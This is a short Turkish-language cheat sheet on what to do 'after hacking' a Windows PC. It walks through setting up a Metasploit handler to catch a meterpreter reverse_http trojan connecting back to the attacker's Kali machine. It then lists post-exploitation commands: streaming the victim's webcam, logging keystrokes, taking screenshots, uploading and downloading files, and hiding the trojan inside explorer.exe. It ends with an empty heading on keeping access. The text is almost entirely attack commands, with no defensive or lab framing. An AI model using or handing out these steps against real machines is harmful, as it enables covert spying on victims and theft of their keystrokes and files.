# Hackledikten Sonra

#### 1. ```msfconsole```
#### 2. ```use exploit/multi/handler```
#### 3. ```set PAYLOAD windows/meterpreter/reverse_http``` (trojan hhtp uzantıı olduğu için http, tcp uzantılı olsaydı ```reverse_tcp``` olucaktı
#### 4. ```lhost 192.168.123.456``` (Kali IP'miz)
#### 5. ```lport 8080```
#### 6. ```exploit -j -z```
#### 7. ```sessions -l```
#### 8. ```session -1```

# Hedef PC'ye Sızdıktan Sonra Kullanılabilecek Komutlar

* ```background```: Session'dan Çıkar
* ```sysinfo```: Bilgisayarın Temel Bilgilerini Gösterir
* ```webcam_stream```: Hedef PC'nin Kamerasını Açar
* ```ps```: Hedef PC'de Çalışan Programları ve Program ID'lerini Gösterir
* ```migrate 2824```: Trojan'i 2824 (explorer.exe) içine saklar (2824 değişebilir, neyin içine saklamak istiyorsan onun ID'sini yazarız)
* ```upload dosyaadı```: Hedef PC'nin İçine Dosya Yüklememizi Sağlar
* ```download dosyaadı```: Hedef PC'nin İçindeki Dosyayı Kali'ye İndirir
* ```keyscan_start```: Hedef PC'de Basılan Tuşları Kaydetmeye Başlar
* ```keyscan_dump```: Hedef PC'de Basılan Tuşları Gösterir
* ```screenshot```: Hedef PC'nin Ekran Görüntüsünü Alır

# Hedef PC'yi Hackledikten Sonra Bağlantıyı Sürdürebilir Hale Getirmek
